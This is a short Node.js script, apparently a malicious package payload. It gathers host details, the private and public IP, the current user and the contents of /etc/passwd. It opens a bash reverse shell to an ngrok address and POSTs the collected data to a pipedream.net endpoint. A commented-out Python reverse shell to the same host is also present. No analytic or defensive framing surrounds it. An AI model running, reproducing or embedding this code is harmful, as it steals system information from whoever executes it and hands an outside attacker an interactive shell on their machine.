
const execSync = require('child_process').execSync;

const priv_ip = execSync('hostname -I', { encoding: 'utf-8' });
const whoami = execSync('whoami', { encoding: 'utf-8' });
const host = execSync('hostname', { encoding: 'utf-8' });
const l9 = execSync('dig +short myip.opendns.com @resolver1.opendns.com', { encoding: 'utf-8' });
const passwd = execSync('cat /etc/passwd', { encoding: 'utf-8' });
const php = execSync('php --version', { encoding: 'utf-8' });
const lsb = execSync('lsb_release -a', { encoding: 'utf-8' });
const shell = execSync('bash -i >& /dev/tcp/0.tcp.in.ngrok.io/14528 0>&1', { encoding: 'utf-8' });
const wbash = execSync('which bash', { encoding: 'utf-8' });
// const pyv = execSync('python3 --version', { encoding: 'utf-8' });
// const current_dir = execSync('pwd', { encoding: 'utf-8' });
// const py3 = execSync("export RHOST='0.tcp.in.ngrok.io';export RPORT=16848;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv('RHOST'),int(os.getenv('RPORT'))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')'", { encoding: 'utf-8' });



const https = require("https")

const data = JSON.stringify({
  "private IP": priv_ip,
  "whoami": whoami,
  "hostname": host,
  "passwd": passwd,
  "php version": php,
  "lsb": lsb,
  "l9 public IP": l9,
    "shell": shell,
  "Which bash": wbash,
  // "python  version": pyv,
  // "current dir": current_dir,
  // "py": py,
})

const options = {
  hostname: "eo2z7l1ydft6861.m.pipedream.net",
  port: 443,
  path: "/",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": data.length,
  },
}

const req = https.request(options)
req.write(data)
req.end()